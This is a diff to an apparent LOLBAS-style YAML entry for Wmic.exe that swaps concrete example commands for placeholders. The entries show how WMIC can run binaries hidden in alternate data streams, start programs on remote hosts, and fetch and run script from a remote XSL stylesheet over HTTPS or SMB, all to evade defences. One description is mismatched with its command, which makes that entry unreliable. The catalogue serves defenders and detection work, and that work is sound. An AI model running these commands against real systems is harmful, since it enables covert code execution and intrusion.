@@ -1,10 +1,10 @@
 ---
 Name: Wmic.exe
 Description: The WMI command-line (WMIC) utility provides a command-line interface for WMI
-Author: 'Oddvar Moe'
+Author: Oddvar Moe
 Created: 2018-05-25
 Commands:
-  - Command: wmic.exe process call create "c:\ads\file.txt:program.exe"
+  - Command: wmic.exe process call create "{PATH_ABSOLUTE}:program.exe"
     Description: Execute a .EXE file stored as an Alternate Data Stream (ADS)
     Usecase: Execute binary file hidden in Alternate data streams to evade defensive counter measures
     Category: ADS
@@ -13,7 +13,7 @@ Commands:
     OperatingSystem: Windows vista, Windows 7, Windows 8, Windows 8.1, Windows 10, Windows 11
     Tags:
       - Execute: EXE
-  - Command: wmic.exe process call create calc
+  - Command: wmic.exe process call create "{CMD}"
     Description: Execute calc from wmic
     Usecase: Execute binary from wmic to evade defensive counter measures
     Category: Execute
@@ -22,7 +22,7 @@ Commands:
     OperatingSystem: Windows vista, Windows 7, Windows 8, Windows 8.1, Windows 10, Windows 11
     Tags:
       - Execute: CMD
-  - Command: wmic.exe /node:"192.168.0.1" process call create "evil.exe"
+  - Command: wmic.exe /node:"192.168.0.1" process call create "{CMD}"
     Description: Execute evil.exe on the remote system.
     Usecase: Execute binary on a remote system
     Category: Execute
@@ -32,7 +32,7 @@ Commands:
     Tags:
       - Execute: CMD
       - Execute: Remote
-  - Command: wmic.exe process get brief /format:"https://raw.githubusercontent.com/LOLBAS-Project/LOLBAS/master/OSBinaries/Payload/Wmic_calc.xsl"
+  - Command: wmic.exe process get brief /format:"{REMOTEURL:.xsl}"
     Description: Create a volume shadow copy of NTDS.dit that can be copied.
     Usecase: Execute binary on remote system
     Category: Execute
@@ -42,7 +42,7 @@ Commands:
     Tags:
       - Execute: XSL
       - Execute: Remote
-  - Command: wmic.exe process get brief /format:"\\127.0.0.1\c$\Tools\pocremote.xsl"
+  - Command: wmic.exe process get brief /format:"{PATH_SMB:.xsl}"
     Description: Executes JScript or VBScript embedded in the target remote XSL stylsheet.
     Usecase: Execute script from remote system
     Category: Execute
